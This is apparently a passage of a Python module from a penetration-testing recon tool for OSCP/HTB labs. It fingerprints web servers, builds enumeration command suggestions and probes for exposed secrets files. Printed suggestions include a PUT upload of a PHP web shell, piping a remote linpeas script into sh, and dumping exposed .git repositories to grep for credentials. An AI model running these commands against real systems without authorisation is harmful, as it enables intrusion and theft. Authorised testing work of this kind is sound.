from __future__ import annotations
import os, random, re, shutil, subprocess, sys, threading
from datetime import datetime
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Optional
from .models import PortResult
from .state import (shutdown_flag, print_lock, _skip_current, PROBE_CACHE, OS_GUESS, WL,
                    DISCOVERY_CACHE, VHOST_BASELINE_CACHE, NMAP_CONTEXT, NMAP_PORT_HINTS,
                    RUNTIME_OPTS, HOSTNAME_CACHE)
from .ui import C, q, strip_ansi, section_header, highlight_box
from .rules_engine import OSCP_BANNED_SUBSTRINGS, _load_rules_json, _rule_matches
from .common import COMMON_SERVICES, SSL_PORTS, HTTP_PORTS, get_port_hint
from .dns_vhosts import _is_ip, compute_vhost_baseline, extract_domain_from_url
from .nmap_context import nmap_hint_banner
from .service_probes import (pentestpad_link, hacktricks_link, probe_smtp_ehlo, probe_ftp_anon,
                              probe_ldap_anon, probe_nfs_exports, probe_rpcinfo, summarize_rpcinfo,
                              probe_redis_noauth, probe_mysql_anon, probe_mssql_anon,
                              probe_mongodb_unauth, probe_postgresql_anon, probe_snmp_community,
                              run_enum4linux, probe_redis_info)
from .web_checks import (http_request_raw, http_status_code, http_body_text, run_gobuster_dir,
                          run_sslscan, check_http_trace, check_http_put, check_http_delete,
                          probe_wordpress_users_api, probe_cms_version_files, check_iis_shortname,
                          check_backup_extensions, check_directory_listing, check_error_disclosure,
                          run_nikto, nikto_ok, check_lfi_indicators, auto_searchsploit,
                          _NIKTO_HIGH_VALUE, _DEFAULT_RULES,
                          detect_api_type, run_api_ferox)

_EXT_SETS = {
  "generic":    ["txt","html","js","css","json","xml","bak","old","log","conf","zip","sql","env","yml","yaml"],
  "php":        ["php","phtml","phps","inc","bak","old","php5","php7","php~","php.bak","php.old","ini"],
  "wordpress":  ["php","txt","html","js","css","json","xml","bak","old","log"],
  "iis":        ["aspx","asp","ashx","asmx","axd","svc","config","bak","old","txt","xml","json","dll","cs","vb","aspx~","asp~"],
  "aspnet":     ["aspx","asp","ashx","asmx","axd","svc","config","bak","old","txt","xml","json","cs","vb","aspx~"],
  "sharepoint": ["aspx","ashx","svc","config","bak","old","xml","html","txt"],
  "java":       ["jsp","do","action","bak","old","java","class","xml","jar","war","properties"],
  "node":       ["js","json","map","bak","old","ts","yml","yaml","env","lock"],
  "coldfusion": ["cfm","cfml","cfc","bak","old"],
  # Python-based frameworks — leak py source, configs, logs
  "python":     ["py","txt","html","json","yml","yaml","cfg","ini","bak","old","log","conf","env"],
  "flask":      ["py","txt","html","json","yml","yaml","cfg","ini","bak","old","log","env"],
  "django":     ["py","html","txt","json","yml","yaml","bak","old","xml","env"],
  # Ruby on Rails
  "ruby":       ["rb","html","json","xml","txt","bak","old","erb","yml","env"],
}

def _web_blob(pr: PortResult) -> str:
    parts = []
    if pr.title:
        parts.append(pr.title)
    if pr.status_line:
        parts.append(pr.status_line)
    if pr.tech:
        parts.extend(pr.tech)
    if pr.whatweb_out and pr.whatweb_out != "__TIMEOUT__":
        parts.append(pr.whatweb_out)
    if pr.waf_detected:
        parts.append(f"waf:{pr.waf_detected}")
    if pr.cms_versions:
        for k,v in pr.cms_versions.items():
            parts.append(f"{k}:{v}")
    # some probes are strong signals
    if pr.probes:
        parts.extend([p.path for p in pr.probes[:40]])
    return " ".join(str(x) for x in parts).lower()

def _seen_extensions(pr: PortResult) -> list[str]:
    exts = []
    for p in (pr.probes or []):
        path = p.path or ""
        # ignore dirs
        if "." in path.rsplit("/", 1)[-1]:
            ext = path.rsplit(".", 1)[-1].lower()
            if 1 <= len(ext) <= 6 and ext.isalnum():
                exts.append(ext)
    return sorted(set(exts))

def _infer_tags(pr: PortResult) -> set[str]:
    blob = _web_blob(pr)
    tags: set[str] = set()
    
    # WinRM detection - ports 5985/5986 with Microsoft-HTTPAPI
    is_winrm = (pr.port in (5985, 5986) and 
                ("microsoft-httpapi" in blob.lower() or 
                 pr.detected_service in ("HTTP", "HTTPS") and pr.port in (5985, 5986)))
    
    if is_winrm:
        tags.add("winrm")
        # Do NOT add 'web' tag for WinRM
    else:
        # Only add web tag if not WinRM
        tags.add("web")

    # Server stacks
    if "server: microsoft-iis" in blob or "microsoft-iis" in blob:
        tags.add("iis")
    if "asp.net" in blob or "x-aspnet" in blob or "__viewstate" in blob:
        tags.add("aspnet")
    if "sharepoint" in blob or "microsoftsharepointteamservices" in blob or "_layouts/" in blob:
        tags.add("sharepoint")

    # Python / Flask / Django
    if "werkzeug" in blob or "flask" in blob or "python" in blob or "wsgi" in blob:
        tags.add("python")
    if "werkzeug" in blob or "flask" in blob:
        tags.add("flask")
    if "django" in blob or "csrfmiddlewaretoken" in blob:
        tags.add("django")
        tags.add("python")

    # Ruby / Rails
    if "ruby" in blob or "rails" in blob or "rack" in blob or "sinatra" in blob:
        tags.add("ruby")

    # ColdFusion (often exposed on :8500 with CFIDE/cfdocs)
    if "cfide" in blob or "cfdocs" in blob or "coldfusion" in blob:
        tags.add("coldfusion")
        tags.add("cfide")

    if "wordpress" in blob or "wp-content" in blob or "wp-includes" in blob or "xmlrpc.php" in blob:
        tags.add("wordpress")
        tags.add("php")
    if "drupal" in blob:
        tags.add("drupal")
        tags.add("php")
    if "joomla" in blob:
        tags.add("joomla")
        tags.add("php")

    if "nginx" in blob:
        tags.add("nginx")
    if "apache" in blob or "httpd" in blob:
        tags.add("apache")
    if "tomcat" in blob or "catalina" in blob:
        tags.add("java")
    if "weblogic" in blob or "jboss" in blob or "wildfly" in blob:
        tags.add("java")
    if "express" in blob or "node.js" in blob:
        tags.add("node")

    # WebDAV hints
    if "webdav" in blob or "dav" in blob and "allow" in blob:
        tags.add("webdav")

    # Spring Boot Actuator
    if any(x in blob for x in ("spring", "actuator", "springboot", "boot/info")):
        tags.add("spring_actuator")
    if any(x in blob for x in ("jenkins", "hudson", "x-jenkins", "Jenkins-Version")):
        tags.add("jenkins")
        tags.add("java")
    # actuator paths found during probing
    if any(p.path.startswith("/actuator") for p in (pr.probes or [])):
        tags.add("spring_actuator")
    # graphql_path set by check_graphql()
    if pr.graphql_path or any("/graphql" in p.path for p in (pr.probes or [])):
        tags.add("graphql")
    # Flask debug mode (Werkzeug debugger)
    if "werkzeug" in blob and ("debugger" in blob or "debug" in blob):
        tags.add("flask_debug")
    # Django debug
    if ("django" in blob or "csrfmiddlewaretoken" in blob) and "traceback" in blob:
        tags.add("django_debug")
    # Next.js / React
    if "next.js" in blob or "__next" in blob or "_next/static" in blob:
        tags.add("nextjs")
    # Laravel
    if "laravel" in blob or "l5-" in blob or "x-csrf-token" in blob:
        tags.add("laravel")
        tags.add("php")

    # Exposed .git (200 OR 403 - both confirm it exists!)
    git_probes = [p for p in (pr.probes or []) if (p.path or "").startswith("/.git")]
    if any(p.status in ("200", "403") for p in git_probes):
        tags.add("git_exposed")
    
    # Exposed .svn
    svn_probes = [p for p in (pr.probes or []) if (p.path or "").startswith("/.svn")]
    if any(p.status in ("200", "403") for p in svn_probes):
        tags.add("svn_exposed")
    
    # Exposed .hg (Mercurial)
    hg_probes = [p for p in (pr.probes or []) if (p.path or "").startswith("/.hg")]
    if any(p.status in ("200", "403") for p in hg_probes):
        tags.add("hg_exposed")
    
    # Exposed .env (only on 200 - 403 means blocked)
    if any((p.path or "").startswith("/.env") for p in (pr.probes or []) if p.status == "200"):
        tags.add("env_exposed")

    # WAF
    if pr.waf_detected and pr.waf_detected not in ("", "none", "timeout"):
        tags.add("waf")

    return tags

def _infer_extensions(pr: PortResult, tags: set[str]) -> list[str]:
    exts = set(_EXT_SETS["generic"])
    seen = _seen_extensions(pr)

    # stack-based
    if "wordpress" in tags:
        exts.update(_EXT_SETS["wordpress"])
    if "php" in tags:
        exts.update(_EXT_SETS["php"])
    if "iis" in tags:
        exts.update(_EXT_SETS["iis"])
    if "aspnet" in tags:
        exts.update(_EXT_SETS["aspnet"])
    if "sharepoint" in tags:
        exts.update(_EXT_SETS["sharepoint"])
    if "java" in tags:
        exts.update(_EXT_SETS["java"])
    if "node" in tags:
        exts.update(_EXT_SETS["node"])
    if "coldfusion" in tags:
        exts.update(_EXT_SETS["coldfusion"])
    if "python" in tags:
        exts.update(_EXT_SETS["python"])
    if "flask" in tags:
        exts.update(_EXT_SETS["flask"])
    if "django" in tags:
        exts.update(_EXT_SETS["django"])
    if "ruby" in tags:
        exts.update(_EXT_SETS["ruby"])

    # observed extensions win
    for e in seen:
        exts.add(e)

    # keep it sane
    preferred = [
        "php","aspx","asp","jsp","js","json","xml","txt","html","config","bak","old",
        "phtml","phps","inc","ashx","asmx","axd","svc","do","action","map","yml","yaml"
    ]
    ordered = []
    for p in preferred:
        if p in exts:
            ordered.append(p)
    # add anything else at end
    for e in sorted(exts):
        if e not in ordered:
            ordered.append(e)
    return ordered[:18]

def build_web_quickwins(pr: PortResult, host_ip: str = None) -> list[str]:
    """Return a list of best-next commands based on observed HTTP output."""
    url = pr.url
    if not url:
        return []

    tags = _infer_tags(pr)
    blob = _web_blob(pr)
    exts = _infer_extensions(pr, tags)
    
    # Extract hostname from URL, but prefer provided host_ip for accuracy
    parsed_host = urlparse(url).hostname or 'HOST'
    actual_host = host_ip if host_ip else parsed_host

    ctx = {
        'url': url,
        'host': parsed_host,
        'ip': actual_host,  # Actual IP address for commands
        'port': pr.port,
        'scheme': urlparse(url).scheme or ('https' if pr.is_ssl else 'http'),
        'exts_csv': ','.join(exts),
        'exts_dot': ','.join(exts),
        # Resolved wordlist paths — use {wl_common}, {wl_iis}, etc. in rules
        'wl_common':     WL.get('web_common',  '/usr/share/wordlists/dirb/common.txt'),
        'wl_medium':     WL.get('web_medium',  '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'),
        'wl_large':      WL.get('web_large',   '/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt'),
        'wl_big':        WL.get('web_big',     '/usr/share/wordlists/dirb/big.txt'),
        # raft-large-words = combined dirs+files (~119K): best single 'find everything' wordlist
        'wl_large_words': WL.get('web_large_words',
                           '/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt'),
        # Combined / lowercase combined wordlists for exhaustive brute-force
        'wl_combined':         WL.get('web_combined',
                                '/usr/share/seclists/Discovery/Web-Content/raft-large-directories-combined.txt'),
        'wl_combined_lower':   WL.get('web_combined_lower',
                                '/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase-combined.txt'),
        'wl_iis':        WL.get('web_iis',     '/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt'),
        'wl_api':        WL.get('web_api',     '/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt'),
        'wl_quickhits':  WL.get('web_quickhits','/usr/share/wordlists/dirb/common.txt'),
        'wl_wp_plugins': WL.get('cms_wp_plugins','/usr/share/wordlists/dirb/common.txt'),
        'wl_wp_themes':  WL.get('cms_wp_themes', '/usr/share/wordlists/dirb/common.txt'),
        'wl_drupal':     WL.get('cms_drupal',   '/usr/share/wordlists/dirb/common.txt'),
        'wl_joomla':     WL.get('cms_joomla',   '/usr/share/wordlists/dirb/common.txt'),
        'wl_sharepoint': WL.get('cms_sharepoint','/usr/share/wordlists/dirb/common.txt'),
        'wl_tomcat':     WL.get('cms_tomcat',   '/usr/share/wordlists/dirb/common.txt'),
        'wl_params':     WL.get('params_burp',  '/usr/share/wordlists/dirb/common.txt'),
        'wl_lfi':        WL.get('lfi',          '/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt'),
        'wl_dns':        WL.get('dns_subdomains','/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'),
        'wl_snmp':       WL.get('snmp_communities','/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt'),
        'wl_rockyou':    WL.get('rockyou',      '/usr/share/wordlists/rockyou.txt'),
    }

    # Load optional user rules from alongside this script.
    rules_path = os.path.join(os.path.dirname(__file__), 'ncscanner_rules.json')
    user_rules = _load_rules_json(rules_path)

    out: list[str] = []
    seen = set()

    def add(cmd: str):
        cmd = cmd.strip()
        if not cmd:
            return
        low = cmd.lower()
        for bad in OSCP_BANNED_SUBSTRINGS:
            if bad in low:
                return

        if cmd in seen:
            return
        seen.add(cmd)
        out.append(cmd)

    # Built-in rules
    for rule in _DEFAULT_RULES:
        if _rule_matches(rule, tags, blob):
            for cmd in rule.get('commands', []):
                try:
                    add(cmd.format(**ctx))
                except Exception:
                    add(cmd)

    # Pre-process user_rules commands: replace any hardcoded wordlist paths
    # with {wl_*} placeholders so format(**ctx) resolves to the actual local path.
    _WL_NORM = {
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt": "{wl_medium}",
        "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt":  "{wl_large}",
        "/usr/share/seclists/Discovery/Web-Content/raft-large-directories-combined.txt":           "{wl_combined}",
        "/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase-combined.txt": "{wl_combined_lower}",
        "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt":        "{wl_large_words}",
        "/usr/share/seclists/Discovery/Web-Content/common.txt":                  "{wl_common}",
        "/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt":               "{wl_iis}",
        "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt":      "{wl_api}",
        "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt":   "{wl_params}",
        "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt":                      "{wl_lfi}",
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt":     "{wl_dns}",
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt":    "{wl_dns}",
        "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt": "{wl_snmp}",
        "/usr/share/wordlists/dirb/common.txt":                                  "{wl_common}",
        "/usr/share/wordlists/dirb/big.txt":                                     "{wl_big}",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt":         "{wl_medium}",
        "/usr/share/wordlists/rockyou.txt":                                      "{wl_rockyou}",
    }
    def _normalize_cmd(c: str) -> str:
        for p, ph in _WL_NORM.items():
            c = c.replace(p, ph)
        return c

    # User rules override/extend
    for rule in user_rules:
        if _rule_matches(rule, tags, blob):
            for cmd in rule.get('commands', []):
                cmd = _normalize_cmd(cmd)
                try:
                    add(cmd.format(**ctx))
                except Exception:
                    add(cmd)

    # Safety: if wildcard 404, recommend filters instead of celebrating hits
    if pr.is_wildcard_404:
        add(f"feroxbuster -u '{url}' --add-slash -x {ctx['exts_csv']} --filter-status {pr.wildcard_status or '200'} -w /usr/share/wordlists/dirb/common.txt")

    # If WAF likely, suggest slower settings
    if 'waf' in tags:
        add(f"feroxbuster -u '{url}' --add-slash -x {ctx['exts_csv']} -t 10 --rate-limit 50 -w /usr/share/wordlists/dirb/common.txt")

    # ── OS-aware post-exploitation suggestions ────────────────────────────────
    _os_context = OS_GUESS.get("os", "")
    if _os_context:
        if "Windows" in _os_context:
            add("# Windows target detected")
            add(f"nxc smb {actual_host} -u USER -p PASS -M spider_plus  # spider shares after auth")
            add(f"evil-winrm -i {actual_host} -u USER -p PASS  # if WinRM open")
            _bh_dom = DISCOVERY_CACHE.get("primary_domain", "") or "DOMAIN"
            add(f"bloodhound-python -c All --zip -u USER -p PASS -d {_bh_dom} -ns {actual_host}  # AD graph")
        elif "Linux" in _os_context or "Unix" in _os_context:
            add("# Linux/Unix target detected")
            add(f"# After shell: curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")

    # If we discovered a domain (LDAP/Nmap/DNS), suggest low-noise vhost enumeration (ffuf).
    dom = DISCOVERY_CACHE.get("primary_domain") or ""
    if dom and shutil.which("ffuf"):
        try:
            parsed = urlparse(url)
            use_ssl = (parsed.scheme == "https")
            port = pr.port
            connect_hint = actual_host
            cache_key = (connect_hint, port, use_ssl, dom)
            baseline_size = 0
            if cache_key in VHOST_BASELINE_CACHE:
                baseline_size = int(VHOST_BASELINE_CACHE[cache_key].get("size", 0))
            else:
                bs, bsz, sample = compute_vhost_baseline(connect_hint, url, dom)
                VHOST_BASELINE_CACHE[cache_key] = {"status": bs, "size": bsz, "sample": sample}
                baseline_size = int(bsz)
            fs = f" -fs {baseline_size}" if baseline_size > 0 else ""
            add(f"ffuf -u '{ctx['scheme']}://{dom}' -H 'Host: FUZZ.{dom}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50{fs}")
        except Exception:
            add(f"ffuf -u '{ctx['scheme']}://{dom}' -H 'Host: FUZZ.{dom}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50")

    # ── HTTPS: inject TLS-skip flags into tool commands ───────────────────────
    # Self-signed and mismatched certs are the norm on HTB/OSCP HTTPS targets.
    # Without these flags the tools either abort or produce zero results.
    if urlparse(url).scheme == "https":
        patched: list[str] = []
        for cmd in out:
            if cmd.startswith("#"):
                patched.append(cmd)
                continue
            # feroxbuster: add -k if not already present
            if "feroxbuster" in cmd and " -k" not in cmd and "--insecure" not in cmd:
                # Insert -k right after the URL argument for readability
                cmd = re.sub(r"(feroxbuster\s+-u\s+\S+)", r"\1 -k", cmd)
            # gobuster: add -k if not already present
            if "gobuster" in cmd and " -k" not in cmd and "--no-tls-validation" not in cmd:
                cmd = re.sub(r"(gobuster\s+\w+\s+-u\s+\S+)", r"\1 -k", cmd)
            # ffuf: add -k if not already present
            if "ffuf" in cmd and " -k" not in cmd:
                cmd = cmd.rstrip() + " -k"
            # wfuzz: add --no-check-certificate if not already present
            if "wfuzz" in cmd and "--no-check-certificate" not in cmd:
                cmd = re.sub(r"^(wfuzz\b)", r"\1 --no-check-certificate", cmd)
            # curl: already uses -k in most places; add it where missing
            # (curl -sS URL ... → curl -skS URL ...)
            if re.match(r"^curl\s+-s[^k]", cmd) and " https://" in cmd:
                cmd = re.sub(r"^(curl\s+-s)", r"\1k", cmd)
            patched.append(cmd)
        out[:] = patched

    return out

def run_quick_web_checks(pr: PortResult, host: str) -> None:
    """Automatically run simple, fast post-discovery web checks.

    Rule: keep the exact reproducible command above the result it produced.
    Only emit findings when something meaningful is present.
    """
    if not pr.url:
        return

    _is_ssl = pr.is_ssl
    _port = pr.port
    _connect = host
    _vhost = ""
    if _is_ip(host):
        _ph = (DISCOVERY_CACHE.get("primary_domain","")
               or next(iter(sorted(HOSTNAME_CACHE.get("etc_hosts", set()))), ""))
        _vhost = _ph or ""

    def _get(path: str, timeout: float = 3.0) -> bytes:
        return http_request_raw(_connect, _port, path, _is_ssl,
                                method="GET", timeout=timeout, max_bytes=32000,
                                host_header=_vhost)

    def _emit(cmd: str, lines: List[str]):
        if not lines:
            return
        with print_lock:
            print(f"  {C.GREY}>> {cmd}{C.END}")
            for line in lines:
                print(line)

    base = pr.url.rstrip("/")
    tech_low = " ".join(t.lower() for t in (pr.tech or []))

    # Generic header/info disclosure recap from already collected data.
    _hdr_lines: List[str] = []
    _header_hits = []
    for t in (pr.tech or []):
        tl = t.lower()
        if any(k in tl for k in ("server:", "x-powered-by:", "x-generator:", "x-aspnet-version:", "x-aspnetmvc-version:")):
            _header_hits.append(t)
    if _header_hits:
        _hdr_lines.append(f"    {C.WHITE}" + " | ".join(_header_hits[:6]) + f"{C.END}")
    if pr.methods:
        _hdr_lines.append(f"    {C.CYAN}Allow:{C.END} {C.WHITE}{', '.join(sorted(set(pr.methods)))}{C.END}")
    if _hdr_lines:
        _emit(f"curl -sS '{base}/' -I | grep -iE 'server|x-powered|php|x-generator|allow'", _hdr_lines)

    # High-value generic files/paths. Prefer already captured bodies when present.
    _interesting_paths = [
        ("/.env", "dotenv file"),
        ("/.git/HEAD", "git metadata"),
        ("/config.php", "config.php"),
        ("/config.php.bak", "config backup"),
        ("/server-status", "server-status"),
        ("/server-status?auto", "server-status auto"),
        ("/.htaccess", ".htaccess"),
        ("/.htpasswd", ".htpasswd"),
    ]
    for path, label in _interesting_paths:
        if shutdown_flag.is_set():
            break
        cmd = f"curl -sk '{base}{path}' | head -n 20"
        lines: List[str] = []
        body = (pr.sensitive_files or {}).get(path, "")
        status = next((p.status for p in (pr.probes or []) if (p.path or "") == path), "")
        if body:
            lines.append(f"    {C.RED}⚡ {label} exposed ({len(body)} bytes){C.END}")
            for ln in body.splitlines()[:6]:
                ln = ln.rstrip()
                if ln:
                    lines.append(f"      {C.WHITE}{ln[:140]}{C.END}")
        elif status in ("401", "403"):
            lines.append(f"    {C.YELLOW}⚠ {label}: HTTP {status} (exists but protected){C.END}")
        else:
            resp = _get(path, timeout=2.0)
            if resp:
                code = http_status_code(resp)
                body_t = http_body_text(resp).strip()
                if code == "200" and body_t:
                    lines.append(f"    {C.RED}⚡ {label} exposed ({len(body_t)} bytes){C.END}")
                    for ln in body_t.splitlines()[:6]:
                        ln = ln.rstrip()
                        if ln:
                            lines.append(f"      {C.WHITE}{ln[:140]}{C.END}")
                elif code in ("401", "403"):
                    lines.append(f"    {C.YELLOW}⚠ {label}: HTTP {code} (exists but protected){C.END}")
        _emit(cmd, lines)

    # IIS / ASP.NET specific quick checks.
    if any(x in tech_low for x in ("iis", "asp", "aspnet", "microsoft")):
        _checks = [
            ("/web.config",         "web.config"),
            ("/Web.config",         "Web.config"),
            ("/trace.axd",          "trace.axd (ASP.NET trace)"),
            ("/elmah.axd",          "elmah.axd (error log)"),
            ("/ScriptResource.axd", "ScriptResource.axd"),
            ("/WebResource.axd",    "WebResource.axd"),
        ]
        for path, label in _checks:
            if shutdown_flag.is_set():
                break
            resp = _get(path, timeout=2.5)
            if not resp:
                continue
            code = http_status_code(resp)
            body = http_body_text(resp).strip()
            out: List[str] = []
            if code == "200" and body and len(body) > 10:
                snippet = body[:200].replace("\n", " ").replace("\r", "")
                out.append(f"    {C.RED}⚡ {label} accessible!{C.END} ({len(body)} bytes)")
                out.append(f"      {C.GREY}{snippet[:120]}{C.END}")
            elif code in ("401", "403"):
                out.append(f"    {C.YELLOW}⚠ {label}: {code} (exists but protected){C.END}")
            _emit(f"curl -sk '{base}{path}'", out)
        if shutil.which("shortscan") and not shutdown_flag.is_set():
            _sc = run_cmd(["shortscan", pr.url], timeout=30)
            _out = []
            if _sc:
                for _sl in _sc.splitlines()[:20]:
                    if any(x in _sl.lower() for x in ("vulnerable", "found", "~1", "short")):
                        _out.append(f"    {C.RED}{_sl.strip()[:120]}{C.END}")
                    elif _sl.strip():
                        _out.append(f"    {C.GREY}{_sl.strip()[:120]}{C.END}")
            _emit(f"shortscan '{pr.url}'", _out)

    # Well-known / security files.
    for path, label in [
        ("/.well-known/security.txt", "security.txt"),
        ("/security.txt",             "security.txt (root)"),
        ("/crossdomain.xml",          "crossdomain.xml"),
        ("/clientaccesspolicy.xml",   "clientaccesspolicy.xml"),
    ]:
        if shutdown_flag.is_set():
            break
        resp = _get(path, timeout=2.0)
        lines: List[str] = []
        if resp and http_status_code(resp) == "200":
            body = http_body_text(resp).strip()
            if body and len(body) > 5:
                lines.append(f"    {C.GREEN}✓ {label} found:{C.END}")
                for line in body.splitlines()[:8]:
                    lines.append(f"      {C.WHITE}{line.strip()[:100]}{C.END}")
        _emit(f"curl -sk '{base}{path}' | head -n 20", lines)

    with print_lock:
        print()

def _buf_add(buf: Dict[int, List[str]], lock: threading.Lock, port: int, line: str):
    with lock:
        if port not in buf:
            buf[port] = []
        buf[port].append(line)

def print_http_block(pr: PortResult, brief: bool):
    """
    Print HTTP findings.
    Rule: if we PRINT a result that came from an automated check,
    print the command to reproduce it immediately ABOVE that result block.
    """
    base_url = pr.url or ""
    scheme = "https" if (base_url.startswith("https://") or pr.port in SSL_PORTS or pr.is_ssl) else "http"
    curl_url = base_url if base_url else f"{scheme}://HOST:{pr.port}/"

    parsed = urlparse(curl_url)
    host = parsed.hostname or "HOST"

    # In sequential (piped) mode: print each command BEFORE the result it produces.
    # In parallel (TTY) mode: collect and print as ▷ Verify with block at end.
    _is_seq = not sys.stdout.isatty()
    _repro_cmds: list = []
    def repro(cmd: str):
        if _is_seq:
            print(f"  {C.GREY}>> {cmd}{C.END}", flush=True)
        else:
            _repro_cmds.append(cmd)

    # --- Headers / redirects ---
    repro(f"curl -sIkL {q(curl_url)}")
    # Compact color legend
    print(f"  {C.RED}■{C.END} RED=critical  {C.YELLOW}■{C.END} YLW=investigate  {C.GREEN}■{C.END} GRN=confirmed  {C.DIM}■ dim=info/cmds{C.END}")
    # Color status by code
    _st = pr.status_line or "?"
    _st_col = C.GREEN if " 200" in _st else C.YELLOW if any(x in _st for x in (" 30", " 403", " 401")) else C.RED if " 5" in _st else C.GREY
    print(f"  {C.CYAN}URL:{C.END} {C.BLUE}{base_url}{C.END}  {C.CYAN}│{C.END}  {C.CYAN}Status:{C.END} {_st_col}{_st}{C.END}")
    if pr.redirect_url:
        print(f"  {C.YELLOW}⚡ Redirects to:{C.END} {C.BLUE}{pr.redirect_url}{C.END}")
        redir_domain = extract_domain_from_url(pr.redirect_url)
        if redir_domain and redir_domain != host:
            print(f"    {C.YELLOW}→ New hostname: {C.GREEN}{redir_domain}{C.END} {C.GREY}(add to /etc/hosts){C.END}")

    # --- Title / Tech ---
    if pr.title or pr.forms or pr.comments or pr.dev_notes or pr.js_secrets or pr.users or pr.emails:
        repro(f"curl -sS {q(curl_url)} | head -n 120")

    if pr.title:
        print(f"  {C.CYAN}Title:{C.END} {C.YELLOW}{pr.title}{C.END}")

    if pr.tech:
        print(f"  {C.CYAN}Tech:{C.END} {', '.join(pr.tech[:18])}")

    # --- Methods (OPTIONS) ---
    if pr.methods:
        repro(f"curl -sSikL {q(curl_url)} -X OPTIONS  # allowed methods")
        interesting = [m for m in pr.methods if m.upper() in ("PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "MOVE", "COPY", "PROPFIND")]
        print(f"  {C.CYAN}Methods:{C.END} {', '.join(sorted(set(pr.methods)))}")
        if interesting:
            print(f"  {C.RED}⚡ Dangerous methods enabled: {', '.join(interesting)}{C.END}")
            methods_upper = [m.upper() for m in pr.methods]
            if "PUT" in methods_upper:
                print(f"    {C.RED}→ PUT enabled - try uploading a shell:{C.END}")
                print(f"      {C.WHITE}curl -X PUT -d '<?php system($_GET[\"cmd\"]); ?>' '{curl_url}shell.php'{C.END}")
            if "MOVE" in methods_upper or "COPY" in methods_upper:
                print(f"    {C.RED}→ MOVE/COPY enabled - WebDAV file operations possible{C.END}")
            if "PROPFIND" in methods_upper:
                print(f"    {C.RED}→ PROPFIND enabled - WebDAV directory listing:{C.END}")
                print(f"      {C.WHITE}curl -X PROPFIND '{curl_url}' -H 'Depth: 1'{C.END}")
            if "TRACE" in methods_upper:
                print(f"    {C.YELLOW}→ TRACE enabled - potential XST (Cross-Site Tracing){C.END}")

    # --- SSL certificate ---
    if pr.ssl_cert_info:
        repro(f"openssl s_client -connect {host}:{pr.port} -servername {host} </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName")
        print(f"  {C.CYAN}SSL Cert:{C.END}")
        for k, v in pr.ssl_cert_info.items():
            print(f"    {C.WHITE}{k}:{C.END} {v}")
        cn = pr.ssl_cert_info.get("CN", "")
        san = pr.ssl_cert_info.get("SAN", "")
        all_names = (cn + " " + san).lower()
        if any(x in all_names for x in (".local", ".internal", ".corp", ".lan", ".home", ".intranet")):
            print(f"  {C.YELLOW}⚡ Certificate reveals internal hostnames! Add to /etc/hosts?{C.END}")

    # --- CMS / versions ---
    if pr.cms_versions:
        print(f"  {C.CYAN}Versions:{C.END}")
        for app, ver in pr.cms_versions.items():
            if ver and ver != "detected":
                print(f"    {C.WHITE}{app}:{C.END} {C.YELLOW}{ver}{C.END}")
            else:
                print(f"    {C.WHITE}{app}{C.END} (detected)")

    # --- Software & Versions (source_recon) ---
    # Shows manifest-derived software bill-of-materials, git exposure, GitHub repos
    _sw = getattr(pr, "software_versions", [])
    _gh = getattr(pr, "github_repos",      [])
    _git= getattr(pr, "git_exposure",      {})
    _ci = getattr(pr, "ci_files",          [])
    _sp_sw = getattr(pr, "searchsploit_software", {})

    if _sw or _gh or _git or _ci:
        print(f"\n  {C.PURPLE}{C.BOLD}╔{'═'*58}╗{C.END}")
        print(f"  {C.PURPLE}{C.BOLD}║{'  SOFTWARE & VERSIONS DETECTED':^58}║{C.END}")
        print(f"  {C.PURPLE}{C.BOLD}╚{'═'*58}╝{C.END}")

        # ── Git exposure ──────────────────────────────────────────────────────
        if _git and _git.get("exposed") == "True":
            remote = _git.get("remote_url", "")
            branch = _git.get("branch", "")
            last_commit = _git.get("last_commit_msg", "")
            print(f"  {C.RED}{C.BOLD}  ⚡ .GIT DIRECTORY EXPOSED — source code may be downloadable!{C.END}")
            if remote:
                print(f"    {C.CYAN}Remote:{C.END} {C.YELLOW}{remote}{C.END}")
                repro(f"git-dumper {q(curl_url + '.git')} /tmp/git_dump_{pr.port}")
                repro(f"cd /tmp/git_dump_{pr.port} && git log --all --oneline | head -20")
                repro(f"cd /tmp/git_dump_{pr.port} && grep -riE 'password|secret|api_key|token|credential' . | head -20")
            if branch:
                print(f"    {C.CYAN}Branch:{C.END}  {branch}")
            if last_commit:
                print(f"    {C.CYAN}Last commit:{C.END} {C.DIM}{last_commit[:100]}{C.END}")
            print()

        # ── CI/CD artefacts ───────────────────────────────────────────────────
        if _ci:
            print(f"  {C.YELLOW}  ⚡ CI/CD pipeline files exposed ({len(_ci)}):{C.END}")
            for ci_path in _ci:
                print(f"    {C.GREY}{ci_path}{C.END}")
                repro(f"curl -sk {q(curl_url.rstrip('/') + ci_path)} | head -40")
            print()

        # ── GitHub / repo links ───────────────────────────────────────────────
        if _gh:
            print(f"  {C.CYAN}  Repository links ({len(_gh)}):{C.END}")
            for repo_url in _gh[:8]:
